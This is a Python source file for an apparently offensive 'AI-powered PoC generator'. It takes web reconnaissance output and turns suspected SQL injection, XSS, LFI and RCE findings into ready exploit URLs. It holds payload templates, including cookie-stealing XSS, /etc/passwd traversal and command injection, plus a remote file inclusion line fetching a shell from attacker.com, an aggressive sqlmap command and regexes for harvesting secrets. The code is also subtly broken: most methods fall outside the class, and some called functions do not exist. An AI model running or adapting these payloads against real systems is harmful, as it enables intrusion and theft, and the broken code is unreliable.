import os
import sys
import json
import requests
import re
import random
import time
import argparse
import logging
import threading
import queue
from urllib.parse import urlparse, urljoin, quote, unquote
from bs4 import BeautifulSoup
import html
import base64
import hashlib
import sqlite3
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple
import numpy as np
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.cluster import DBSCAN
import joblib

class AdvancedAIPOCGenerator:
  def __init__(self, workdir: str, poc_dir: str):
    self.workdir = workdir
    self.poc_dir = poc_dir
    self.session = requests.Session()
    self.session.headers.update({
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
'Accept-Language': 'en-US,en;q=0.5',
'Accept-Encoding': 'gzip, deflate',
'Connection': 'keep-alive',
'Upgrade-Insecure-Requests': '1',
})

    # AI Model initialization
    self.vectorizer = TfidfVectorizer(max_features=1000, stop_words='english')
    self.vulnerability_patterns = self.load_vulnerability_patterns()
    self.exploit_templates = self.load_exploit_templates()
    
    # Setup logging
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(os.path.join(workdir, 'ai_poc.log')),
            logging.StreamHandler()
        ]
    )
    self.logger = logging.getLogger(__name__)

def load_vulnerability_patterns(self) -> Dict[str, Any]:
    """Load AI-trained vulnerability detection patterns"""
    patterns = {
        'sql_injection': {
            'patterns': [
                r'select.*from', r'union.*select', r'insert.*into', 
                r'update.*set', r'delete.*from', r'drop.*table',
                r'exec\(', r'waitfor.*delay', r'sleep\([0-9]+\)',
                r'benchmark\(', r'@@version', r'information_schema',
                r'pg_sleep', r'dbms_pipe', r'utl_http'
            ],
            'confidence_threshold': 0.85
        },
        'xss': {
            'patterns': [
                r'<script>', r'javascript:', r'onerror=', r'onload=',
                r'onmouseover=', r'alert\(', r'prompt\(', r'confirm\(',
                r'document\.cookie', r'window\.location', r'eval\(',
                r'setTimeout\(', r'setInterval\(', r'innerHTML'
            ],
            'confidence_threshold': 0.80
        },
        'lfi': {
            'patterns': [
                r'\.\./', r'\.\.\\', r'etc/passwd', r'proc/self/environ',
                r'windows/win\.ini', r'\.\.%2f', r'\.\.%5c',
                r'php://filter', r'data://', r'expect://'
            ],
            'confidence_threshold': 0.75
        },
        'rce': {
            'patterns': [
                r'exec\(', r'system\(', r'passthru\(', r'shell_exec\(',
                r'popen\(', r'proc_open\(', r'`.*`', r'\|\|.*bash',
                r'curl.*\|.*bash', r'wget.*\|.*bash'
            ],
            'confidence_threshold': 0.90
        },
        'idor': {
            'patterns': [
                r'id=[0-9]+', r'user_id=[0-9]+', r'account_id=[0-9]+',
                r'uid=[0-9]+', r'filename=.*\.\.', r'document_id=[0-9]+'
            ],
            'confidence_threshold': 0.70
        }
    }
    return patterns

def load_exploit_templates(self) -> Dict[str, str]:
    """Load AI-generated exploit templates"""
    return {
        'sql_injection': {
            'basic': "' OR '1'='1' --",
            'time_based': "' OR IF(1=1,SLEEP(5),0) --",
            'error_based': "' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION())) --",
            'union': "' UNION SELECT NULL,@@version,NULL --"
        },
        'xss': {
            'basic': '<script>alert("XSS")</script>',
            'svg': '<svg onload=alert("XSS")>',
            'img': '<img src=x onerror=alert("XSS")>',
            'javascript': 'javascript:alert("XSS")'
        },
        'lfi': {
            'basic': '../../../../etc/passwd',
            'null_byte': '../../../../etc/passwd%00',
            'php_wrapper': 'php://filter/convert.base64-encode/resource=index.php',
            'log_poisoning': '/var/log/apache2/access.log'
        },
        'rce': {
            'unix': ';id;',
            'windows': '&whoami',
            'php': ';system("id");',
            'python': ';__import__("os").system("id")'
        }
    }

def analyze_target(self) -> List[Dict[str, Any]]:
    """Comprehensive AI analysis of the target"""
    self.logger.info("Starting AI-powered target analysis...")
    
    findings = []
    
    # Analyze all gathered data
    findings.extend(self.analyze_urls())
    findings.extend(self.analyze_subdomains())
    findings.extend(self.analyze_technology_stack())
    findings.extend(self.analyze_vulnerability_scans())
    
    # AI-powered deep analysis
    findings.extend(self.ai_deep_analysis())
    
    return findings

def analyze_urls(self) -> List[Dict[str, Any]]:
    """AI analysis of discovered URLs"""
    findings = []
    urls_file = os.path.join(self.workdir, 'all-urls.txt')
    
    if not os.path.exists(urls_file):
        return findings
    
    with open(urls_file, 'r', encoding='utf-8') as f:
        urls = [line.strip() for line in f if line.strip()]
    
    self.logger.info(f"Analyzing {len(urls)} URLs for potential vulnerabilities...")
    
    # Cluster URLs for pattern analysis
    url_clusters = self.cluster_urls(urls)
    
    for cluster_id, cluster_urls in url_clusters.items():
        if len(cluster_urls) > 3:  # Significant pattern
            sample_url = cluster_urls[0]
            vulnerability_type = self.detect_url_pattern_vulnerability(sample_url)
            
            if vulnerability_type:
                finding = {
                    'type': vulnerability_type,
                    'severity': 'high',
                    'confidence': 0.85,
                    'target': sample_url,
                    'description': f'Pattern-based {vulnerability_type} vulnerability detected in URL structure',
                    'evidence': f'Multiple URLs with similar pattern: {cluster_urls[:3]}...',
                    'poc': self.generate_poc(vulnerability_type, sample_url)
                }
                findings.append(finding)
    
    return findings

def cluster_urls(self, urls: List[str]) -> Dict[int, List[str]]:
    """Cluster URLs using AI for pattern recognition"""
    try:
        # Extract features from URLs
        features = []
        for url in urls:
            parsed = urlparse(url)
            features.append(f"{parsed.path}?{parsed.query}")
        
        # Vectorize text features
        X = self.vectorizer.fit_transform(features)
        
        # Cluster using DBSCAN
        clustering = DBSCAN(eps=0.3, min_samples=2).fit(X.toarray())
        
        clusters = {}
        for i, label in enumerate(clustering.labels_):
            if label not in clusters:
                clusters[label] = []
            clusters[label].append(urls[i])
        
        return clusters
    except Exception as e:
        self.logger.error(f"URL clustering failed: {e}")
        return {-1: urls}  # Return all URLs in one cluster

def detect_url_pattern_vulnerability(self, url: str) -> Optional[str]:
    """Detect vulnerability type from URL pattern"""
    parsed = urlparse(url)
    
    # Check query parameters for suspicious patterns
    query_params = parsed.query
    if not query_params:
        return None
    
    for vuln_type, patterns in self.vulnerability_patterns.items():
        for pattern in patterns['patterns']:
            if re.search(pattern, query_params, re.IGNORECASE):
                return vuln_type
    
    return None

def analyze_subdomains(self) -> List[Dict[str, Any]]:
    """AI analysis of subdomains"""
    findings = []
    subdomains_file = os.path.join(self.workdir, 'all-subdomains.txt')
    
    if not os.path.exists(subdomains_file):
        return findings
    
    with open(subdomains_file, 'r') as f:
        subdomains = [line.strip() for line in f if line.strip()]
    
    # Analyze for subdomain takeover possibilities
    vulnerable_subdomains = self.check_subdomain_takeover(subdomains)
    
    for subdomain in vulnerable_subdomains:
        finding = {
            'type': 'subdomain_takeover',
            'severity': 'critical',
            'confidence': 0.90,
            'target': subdomain,
            'description': 'Potential subdomain takeover vulnerability',
            'evidence': 'Subdomain points to non-existent service',
            'poc': f'Register the vulnerable service on {subdomain.split("//")[-1].split("/")[0]}'
        }
        findings.append(finding)
    
    return findings

def check_subdomain_takeover(self, subdomains: List[str]) -> List[str]:
    """Check for subdomain takeover vulnerabilities"""
    vulnerable = []
    common_services = [
        'github.io', 'herokuapp.com', 'azurewebsites.net', 
        'cloudfront.net', 's3.amazonaws.com', 'digitalocean.spaces'
    ]
    
    for subdomain in subdomains:
        try:
            response = self.session.get(subdomain, timeout=10, verify=False)
            if response.status_code in [404, 503, 403]:
                for service in common_services:
                    if service in response.text:
                        vulnerable.append(subdomain)
                        break
        except:
            continue
    
    return vulnerable

def analyze_technology_stack(self) -> List[Dict[str, Any]]:
    """AI analysis of technology stack for known vulnerabilities"""
    findings = []
    tech_files = [f for f in os.listdir(self.workdir) if f.startswith('whatweb-')]
    
    for tech_file in tech_files:
        target = tech_file.replace('whatweb-', '').replace('.txt', '')
        file_path = os.path.join(self.workdir, tech_file)
        
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # Detect technologies and their versions
        technologies = self.extract_technologies(content)
        
        for tech, version in technologies.items():
            vulns = self.check_technology_vulnerabilities(tech, version)
            for vuln in vulns:
                finding = {
                    'type': 'technology_vulnerability',
                    'severity': vuln['severity'],
                    'confidence': 0.95,
                    'target': target,
                    'description': f'{tech} {version} - {vuln["description"]}',
                    'evidence': f'Technology detected: {tech} {version}',
                    'poc': vuln['poc']
                }
                findings.append(finding)
    
    return findings

def extract_technologies(self, content: str) -> Dict[str, str]:
    """Extract technologies and versions from whatweb output"""
    technologies = {}
    patterns = {
        'WordPress': r'WordPress\[([^\]]+)\]',
        'Apache': r'Apache\[([^\]]+)\]',
        'nginx': r'nginx\[([^\]]+)\]',
        'PHP': r'PHP\[([^\]]+)\]',
        'Joomla': r'Joomla\[([^\]]+)\]',
        'Drupal': r'Drupal\[([^\]]+)\]'
    }
    
    for tech, pattern in patterns.items():
        match = re.search(pattern, content)
        if match:
            technologies[tech] = match.group(1)
    
    return technologies

def check_technology_vulnerabilities(self, technology: str, version: str) -> List[Dict[str, Any]]:
    """Check for known vulnerabilities in specific technology versions"""
    # This would typically connect to a vulnerability database
    # For now, using a simple mockup
    vulns = []
    
    vuln_db = {
        'WordPress': {
            '<5.0': {
                'description': 'Multiple critical vulnerabilities in WordPress <5.0',
                'severity': 'critical',
                'poc': 'Use known WordPress exploit chains for version <5.0'
            }
        },
        'PHP': {
            '<7.0': {
                'description': 'PHP versions <7.0 have numerous security issues',
                'severity': 'high',
                'poc': 'Exploit PHP version specific vulnerabilities'
            }
        }
    }
    
    if technology in vuln_db:
        for version_range, vuln_info in vuln_db[technology].items():
            if self.version_in_range(version, version_range):
                vulns.append(vuln_info)
    
    return vulns

def version_in_range(self, version: str, version_range: str) -> bool:
    """Check if version is in specified range"""
    # Simple version comparison logic
    try:
        if version_range.startswith('<'):
            max_version = version_range[1:]
            return version < max_version
        # Add more complex range checks as needed
    except:
        return False
    return False

def analyze_vulnerability_scans(self) -> List[Dict[str, Any]]:
    """AI analysis of existing vulnerability scan results"""
    findings = []
    scan_files = [f for f in os.listdir(self.workdir) if f.startswith('nuclei-') or f.startswith('nikto-')]
    
    for scan_file in scan_files:
        file_path = os.path.join(self.workdir, scan_file)
        
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # Extract high confidence vulnerabilities
        high_confidence_vulns = self.extract_high_confidence_vulns(content)
        
        for vuln in high_confidence_vulns:
            finding = {
                'type': vuln['type'],
                'severity': vuln['severity'],
                'confidence': 0.90,
                'target': vuln['target'],
                'description': vuln['description'],
                'evidence': f'Detected by {scan_file}',
                'poc': self.generate_advanced_poc(vuln['type'], vuln['target'])
            }
            findings.append(finding)
    
    return findings

def extract_high_confidence_vulns(self, content: str) -> List[Dict[str, Any]]:
    """Extract high confidence vulnerabilities from scan results"""
    vulns = []
    
    # Nuclei results parsing
    nuclei_patterns = {
        'critical': r'\[critical\]\s*(.*?)\s*\[(.*?)\]',
        'high': r'\[high\]\s*(.*?)\s*\[(.*?)\]'
    }
    
    for severity, pattern in nuclei_patterns.items():
        matches = re.findall(pattern, content, re.IGNORECASE)
        for match in matches:
            vulns.append({
                'type': self.classify_vulnerability(match[0]),
                'severity': severity,
                'description': match[0],
                'target': match[1]
            })
    
    return vulns

def classify_vulnerability(self, description: str) -> str:
    """Classify vulnerability type from description"""
    description_lower = description.lower()
    
    if any(word in description_lower for word in ['sql', 'database', 'injection']):
        return 'sql_injection'
    elif any(word in description_lower for word in ['xss', 'cross-site', 'script']):
        return 'xss'
    elif any(word in description_lower for word in ['lfi', 'local file', 'directory traversal']):
        return 'lfi'
    elif any(word in description_lower for word in ['rce', 'remote code', 'command injection']):
        return 'rce'
    elif any(word in description_lower for word in ['idor', 'insecure direct object']):
        return 'idor'
    else:
        return 'unknown'

def ai_deep_analysis(self) -> List[Dict[str, Any]]:
    """Advanced AI analysis using multiple data sources"""
    findings = []
    
    # Analyze parameters for injection points
    findings.extend(self.analyze_parameters())
    
    # Analyze JavaScript files for secrets and vulnerabilities
    findings.extend(self.analyze_javascript_files())
    
    # Analyze for business logic vulnerabilities
    findings.extend(self.analyze_business_logic())
    
    return findings

def analyze_parameters(self) -> List[Dict[str, Any]]:
    """AI analysis of URL parameters for injection points"""
    findings = []
    params_file = os.path.join(self.workdir, 'parameters-urls.txt')
    
    if not os.path.exists(params_file):
        return findings
    
    with open(params_file, 'r') as f:
        param_urls = [line.strip() for line in f if line.strip()]
    
    for url in param_urls[:10]:  # Limit to first 10 for performance
        try:
            response = self.session.get(url, timeout=10, verify=False)
            if response.status_code == 200:
                injection_points = self.find_injection_points(url, response.text)
                
                for point in injection_points:
                    finding = {
                        'type': point['type'],
                        'severity': 'medium',
                        'confidence': point['confidence'],
                        'target': url,
                        'description': f'Potential {point["type"]} injection point detected',
                        'evidence': f'Parameter: {point["parameter"]}, Context: {point["context"]}',
                        'poc': self.generate_poc(point['type'], url, point['parameter'])
                    }
                    findings.append(finding)
        except:
            continue
    
    return findings

def find_injection_points(self, url: str, html_content: str) -> List[Dict[str, Any]]:
    """Find potential injection points in HTML response"""
    points = []
    parsed = urlparse(url)
    query_params = parsed.query.split('&')
    
    soup = BeautifulSoup(html_content, 'html.parser')
    
    for param in query_params:
        if '=' in param:
            param_name = param.split('=')[0]
            param_value = param.split('=')[1] if len(param.split('=')) > 1 else ''
            
            # Check if parameter value is reflected in HTML
            if param_value and param_value in html_content:
                # Analyze context of reflection
                context = self.get_reflection_context(html_content, param_value)
                
                if context == 'html':
                    points.append({
                        'type': 'xss',
                        'parameter': param_name,
                        'context': context,
                        'confidence': 0.75
                    })
                elif context == 'javascript':
                    points.append({
                        'type': 'xss',
                        'parameter': param_name,
                        'context': context,
                        'confidence': 0.85
                    })
    
    return points

def get_reflection_context(self, html_content: str, value: str) -> str:
    """Get the context where value is reflected"""
    if f'<script>{value}</script>' in html_content or f'="{value}"' in html_content:
        return 'javascript'
    elif f'<{value}' in html_content or f'>{value}</' in html_content:
        return 'html'
    else:
        return 'text'

def analyze_javascript_files(self) -> List[Dict[str, Any]]:
    """AI analysis of JavaScript files for secrets and vulnerabilities"""
    findings = []
    js_files_file = os.path.join(self.workdir, 'js-files.txt')
    
    if not os.path.exists(js_files_file):
        return findings
    
    with open(js_files_file, 'r') as f:
        js_files = [line.strip() for line in f if line.strip()]
    
    for js_file in js_files[:5]:  # Limit to first 5 for performance
        try:
            response = self.session.get(js_file, timeout=10, verify=False)
            if response.status_code == 200:
                secrets = self.find_secrets_in_js(response.text)
                vulnerabilities = self.find_js_vulnerabilities(response.text)
                
                for secret in secrets:
                    finding = {
                        'type': 'information_disclosure',
                        'severity': 'high',
                        'confidence': 0.90,
                        'target': js_file,
                        'description': f'Secret found in JavaScript file: {secret["type"]}',
                        'evidence': f'Secret: {secret["value"][:50]}...',
                        'poc': f'Review JavaScript file: {js_file}'
                    }
                    findings.append(finding)
                
                for vuln in vulnerabilities:
                    finding = {
                        'type': 'javascript_vulnerability',
                        'severity': 'medium',
                        'confidence': 0.80,
                        'target': js_file,
                        'description': f'JavaScript vulnerability: {vuln["type"]}',
                        'evidence': f'Code pattern: {vuln["pattern"]}',
                        'poc': f'Analyze JavaScript file: {js_file}'
                    }
                    findings.append(finding)
        except:
            continue
    
    return findings

def find_secrets_in_js(self, js_code: str) -> List[Dict[str, str]]:
    """Find secrets in JavaScript code"""
    secrets = []
    patterns = {
        'api_key': r'api[_-]?key["\']?\\s*[:=]\\s*["\']([^"\']+)["\']',
        'auth_token': r'auth[_-]?token["\']?\\s*[:=]\\s*["\']([^"\']+)["\']',
        'password': r'password["\']?\\s*[:=]\\s*["\']([^"\']+)["\']',
        'jwt': r'eyJhbGciOiJ[^"\'\\s]+',
        'aws_key': r'AKIA[0-9A-Z]{16}',
        'private_key': r'-----BEGIN PRIVATE KEY-----'
    }
    
    for secret_type, pattern in patterns.items():
        matches = re.findall(pattern, js_code, re.IGNORECASE)
        for match in matches:
            secrets.append({'type': secret_type, 'value': match})
    
    return secrets

def find_js_vulnerabilities(self, js_code: str) -> List[Dict[str, str]]:
    """Find JavaScript code vulnerabilities"""
    vulnerabilities = []
    patterns = {
        'eval_usage': r'eval\\(',
        'innerHTML_usage': r'innerHTML\\s*=',
        'document_write': r'document\\.write\\(',
        'jquery_vuln': r'\\$\\.ajax\\([^)]*dataType[^)]*script'
    }
    
    for vuln_type, pattern in patterns.items():
        if re.search(pattern, js_code, re.IGNORECASE):
            vulnerabilities.append({'type': vuln_type, 'pattern': pattern})
    
    return vulnerabilities

def analyze_business_logic(self) -> List[Dict[str, Any]]:
    """AI analysis for business logic vulnerabilities"""
    findings = []
    # This would involve complex analysis of application workflow
    # For now, placeholder for business logic analysis
    
    return findings

def generate_poc(self, vuln_type: str, target: str, parameter: str = None) -> str:
    """Generate advanced Proof of Concept for vulnerability"""
    if vuln_type in self.exploit_templates:
        template = random.choice(list(self.exploit_templates[vuln_type].values()))
        
        if parameter:
            # Create a parameter-based POC
            parsed = urlparse(target)
            query_params = parsed.query.split('&')
            new_params = []
            
            for param in query_params:
                if '=' in param:
                    param_name, param_value = param.split('=', 1)
                    if param_name == parameter:
                        param_value = template
                    new_params.append(f'{param_name}={param_value}')
            
            new_query = '&'.join(new_params)
            poc_url = f'{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}'
            return f'Exploit URL: {poc_url}'
        else:
            return f'Exploit payload: {template}'
    
    return 'Manual exploitation required'

def generate_advanced_poc(self, vuln_type: str, target: str) -> str:
    """Generate advanced POC with exploitation steps"""
    if vuln_type == 'sql_injection':
        return self.generate_sql_poc(target)
    elif vuln_type == 'xss':
        return self.generate_xss_poc(target)
    elif vuln_type == 'lfi':
        return self.generate_lfi_poc(target)
    elif vuln_type == 'rce':
        return self.generate_rce_poc(target)
    else:
        return self.generate_poc(vuln_type, target)

def generate_sql_poc(self, target: str) -> str:
    """Generate advanced SQL injection POC"""
    return f"""SQL Injection Proof of Concept:
Basic Injection:
{target}?id=1' OR '1'='1' --

Time-Based Blind:
{target}?id=1' AND IF(1=1,SLEEP(5),0) --

Error-Based:
{target}?id=1' AND EXTRACTVALUE(1, CONCAT(0x7e,VERSION())) --

Union-Based:
{target}?id=1' UNION SELECT NULL,@@version,NULL --

Test with sqlmap for automated exploitation:
sqlmap -u "{target}" --batch --level=3 --risk=3
"""

def generate_xss_poc(self, target: str) -> str:
    """Generate advanced XSS POC"""
    return f"""XSS Proof of Concept:
Basic Payload:
{target}?search=<script>alert('XSS')</script>

SVG Payload:
{target}?image=<svg onload=alert('XSS')>

DOM-Based:
{target}#javascript:alert('XSS')

Advanced Payload:
{target}?input=<img src=x onerror=alert(document.cookie)>

Test with browser console to verify execution context.
"""

def generate_lfi_poc(self, target: str) -> str:
    """Generate advanced LFI POC"""
    return f"""LFI Proof of Concept:
Basic Directory Traversal:
{target}?file=../../../../etc/passwd

PHP Wrapper:
{target}?file=php://filter/convert.base64-encode/resource=index.php

Null Byte:
{target}?file=../../../../etc/passwd%00

Log Poisoning:
{target}?file=/var/log/apache2/access.log

Use base64 decoding for PHP wrapper results.
"""

def generate_rce_poc(self, target: str) -> str:
    """Generate advanced RCE POC"""
    return f"""RCE Proof of Concept:
Command Injection:
{target}?cmd=;id;

PHP Code Execution:
{target}?code=<?php system("id"); ?>

Python Injection:
{target}?eval=import("os").system("id")

Remote File Inclusion:
{target}?file=http://attacker.com/shell.txt

Use URL encoding for special characters.
"""

def test_auth(self, target: str, workdir: str) -> None:
    """Test authentication mechanisms"""
    self.logger.info(f"Testing authentication on {target}")
    # Implement advanced auth testing logic

def test_idor(self, target: str, workdir: str) -> None:
    """Test IDOR vulnerabilities"""
    self.logger.info(f"Testing IDOR on {target}")
    # Implement advanced IDOR testing logic

def save_findings(self, findings: List[Dict[str, Any]]) -> None:
    """Save findings to output file"""
    output_file = os.path.join(self.workdir, 'ai_analysis.txt')
    poc_file = os.path.join(self.workdir, 'poc.txt')
    
    with open(output_file, 'w', encoding='utf-8') as f:
        f.write("AI-Powered Vulnerability Analysis Report\n")
        f.write("=" * 50 + "\n\n")
        f.write(f"Generated on: {datetime.now()}\n")
        f.write(f"Target: {self.workdir}\n\n")
        
        for i, finding in enumerate(findings, 1):
            f.write(f"Finding #{i}:\n")
            f.write(f"Type: {finding['type']}\n")
            f.write(f"Severity: {finding['severity']}\n")
            f.write(f"Confidence: {finding['confidence']}\n")
            f.write(f"Target: {finding['target']}\n")
            f.write(f"Description: {finding['description']}\n")
            f.write(f"Evidence: {finding['evidence']}\n")
            f.write(f"PoC: {finding['poc']}\n")
            f.write("-" * 50 + "\n\n")
    
    # Save only PoCs to separate file
    with open(poc_file, 'a', encoding='utf-8') as f:
        f.write("\nAI-Generated Proof of Concepts:\n")
        f.write("=" * 50 + "\n\n")
        for finding in findings:
            if finding['severity'] in ['high', 'critical']:
                f.write(f"Target: {finding['target']}\n")
                f.write(f"Vulnerability: {finding['type']}\n")
                f.write(f"PoC: {finding['poc']}\n")
                f.write("-" * 30 + "\n")

def auto_pattern_learning(self, urls: List[str]) -> List[str]:
        """Belajar pola baru dari URL yang sering muncul dan anomali"""
        patterns = set()
        for url in urls:
            parsed = urlparse(url)
            path = parsed.path
            if path.count('/') > 2:
                patterns.add(re.sub(r'\d+', '{id}', path))
            if re.search(r'[A-Za-z0-9]{32,}', url):
                patterns.add('possible_token_or_hash')
        return list(patterns)

def auto_scoring(self, finding: Dict[str, Any]) -> float:
        """Menilai risiko secara otomatis berdasarkan pola dan frekuensi"""
        score = 0.5
        if finding.get('severity') == 'critical':
            score += 0.3
        if finding.get('correlated_count', 0) > 2:
            score += 0.1
        if finding.get('pattern') == 'possible_token_or_hash':
            score += 0.1
        if finding.get('type') in ['rce', 'subdomain_takeover']:
            score += 0.2
        return min(score, 1.0)

def auto_recommendation(self, finding: Dict[str, Any]) -> str:
        """Memberikan saran mitigasi otomatis berdasarkan tipe temuan"""
        recommendations = {
            'sql_injection': 'Gunakan prepared statement dan validasi input.',
            'xss': 'Escape output dan gunakan Content Security Policy (CSP).',
            'lfi': 'Validasi path dan batasi akses file.',
            'rce': 'Sanitasi input dan batasi fungsi eksekusi.',
            'idor': 'Implementasi access control dan validasi otorisasi.',
            'subdomain_takeover': 'Hapus DNS record yang tidak digunakan.',
            'information_disclosure': 'Hapus data sensitif dari kode dan konfigurasi.',
            'javascript_vulnerability': 'Audit kode JS dan hindari eval/innerHTML.'
        }
        return recommendations.get(finding.get('type'), 'Audit dan perbaiki konfigurasi keamanan.')

def auto_chaining(self, findings: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Deteksi kemungkinan eksploitasi berantai (chained attack)"""
        chains = []
        for f1 in findings:
            for f2 in findings:
                if f1 != f2 and f1.get('target') == f2.get('target'):
                    if f1.get('type') == 'idor' and f2.get('type') == 'rce':
                        chains.append({
                            'chain': ['idor', 'rce'],
                            'target': f1['target'],
                            'description': 'IDOR dapat digunakan untuk akses endpoint RCE.',
                            'severity': 'critical'
                        })
                    if f1.get('type') == 'lfi' and f2.get('type') == 'rce':
                        chains.append({
                            'chain': ['lfi', 'rce'],
                            'target': f1['target'],
                            'description': 'LFI dapat digunakan untuk eksekusi kode (RCE).',
                            'severity': 'critical'
                        })
        return chains

def auto_summary(self, findings: List[Dict[str, Any]]) -> str:
        """Membuat ringkasan otomatis dari semua temuan"""
        summary = f"Total findings: {len(findings)}\n"
        types = {}
        for f in findings:
            types[f.get('type')] = types.get(f.get('type'), 0) + 1
        for t, count in types.items():
            summary += f"- {t}: {count}\n"
        criticals = [f for f in findings if f.get('severity') == 'critical']
        summary += f"Critical findings: {len(criticals)}\n"
        return summary

def auto_correlation(self, findings: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Menghubungkan temuan yang mirip berdasarkan target dan tipe"""
        correlated = []
        seen = set()
        for f in findings:
            key = f"{f.get('type')}-{f.get('target')}"
            if key not in seen:
                similar = [g for g in findings if g.get('type') == f.get('type') and g.get('target') == f.get('target')]
                if len(similar) > 1:
                    f['correlated_count'] = len(similar)
                    f['correlated_targets'] = [g.get('target') for g in similar]
                correlated.append(f)
                seen.add(key)
        return correlated

def run(self) -> None:
        self.logger.info("Starting advanced AI-powered vulnerability analysis...")
        findings = self.analyze_target()
        # Pattern learning
        urls_file = os.path.join(self.workdir, 'all-urls.txt')
        if os.path.exists(urls_file):
            with open(urls_file, 'r', encoding='utf-8') as f:
                urls = [line.strip() for line in f if line.strip()]
            learned_patterns = self.auto_pattern_learning(urls)
            for pattern in learned_patterns:
                findings.append({
                    'type': 'pattern_learning',
                    'severity': 'medium',
                    'confidence': 0.7,
                    'target': 'multiple',
                    'description': f'Pattern learned: {pattern}',
                    'evidence': f'Pattern found in URLs',
                    'poc': f'Investigate URLs with pattern: {pattern}'
                })
        # Chaining
        chains = self.auto_chaining(findings)
        for chain in chains:
            findings.append({
                'type': 'chained_attack',
                'severity': chain['severity'],
                'confidence': 0.95,
                'target': chain['target'],
                'description': chain['description'],
                'evidence': f'Chain: {chain["chain"]}',
                'poc': f'Exploit chain: {" -> ".join(chain["chain"])}'
            })
        # Correlation
        findings = self.auto_correlation(findings)
        # Scoring & recommendation
        for f in findings:
            f['risk_score'] = self.auto_scoring(f)
            f['recommendation'] = self.auto_recommendation(f)
        # Prioritize
        findings = sorted(findings, key=lambda x: (x['risk_score'], x['confidence']), reverse=True)
        # Save
        self.save_findings(findings)
        with open(os.path.join(self.workdir, 'findings.json'), 'w', encoding='utf-8') as f:
            json.dump(findings, f, indent=2)
        # Summary
        summary = self.auto_summary(findings)
        with open(os.path.join(self.workdir, 'summary.txt'), 'w', encoding='utf-8') as f:
            f.write(summary)
        self.logger.info(f"Analysis complete. Found {len(findings)} potential vulnerabilities.")
        self.logger.info(f"Results saved to ai_analysis.txt, findings.json, and summary.txt")

def main():
    parser = argparse.ArgumentParser(description='Advanced AI-Powered PoC Generator')
    parser.add_argument('workdir', help='Working directory with scan results')
    parser.add_argument('poc_dir', help='Directory to save PoCs')
    parser.add_argument('--test-auth', help='Test authentication on target')
    parser.add_argument('--test-idor', help='Test IDOR on target')
    parser.add_argument('--test-jwt', help='Test JWT on target')
    parser.add_argument('--test-oauth', help='Test OAuth on target')
    args = parser.parse_args()

    ai_generator = AdvancedAIPOCGenerator(args.workdir, args.poc_dir)
    if args.test_auth:
        ai_generator.test_auth(args.test_auth, args.workdir)
    elif args.test_idor:
        ai_generator.test_idor(args.test_idor, args.workdir)
    elif args.test_jwt:
        ai_generator.test_jwt(args.test_jwt, args.workdir)
    elif args.test_oauth:
        ai_generator.test_oauth(args.test_oauth, args.workdir)
    else:
        ai_generator.run()

if __name__ == '__main__':
    main()